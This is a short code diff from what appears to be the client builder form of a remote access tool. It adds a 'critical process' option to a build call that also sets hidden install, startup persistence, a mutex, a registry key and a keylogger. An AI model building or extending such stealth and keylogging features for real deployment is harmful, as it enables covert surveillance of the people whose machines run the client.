@@ -271,7 +271,7 @@ namespace xServer.Forms
 
                         ClientBuilder.Build(output, txtTag.Text, HostHelper.GetRawHosts(_hosts), txtPassword.Text, txtInstallsub.Text,
                             txtInstallname.Text + ".exe", txtMutex.Text, txtRegistryKeyName.Text, chkInstall.Checked, chkStartup.Checked,
-                            chkHide.Checked, chkKeylogger.Checked, int.Parse(txtDelay.Text), GetInstallPath(), icon, asmInfo,
+                            chkHide.Checked, chkKeylogger.Checked, chkCritical.Checked, int.Parse(txtDelay.Text), GetInstallPath(), icon, asmInfo,
                             Application.ProductVersion);
 
                         MessageBox.Show("Successfully built client!", "Success", MessageBoxButtons.OK,
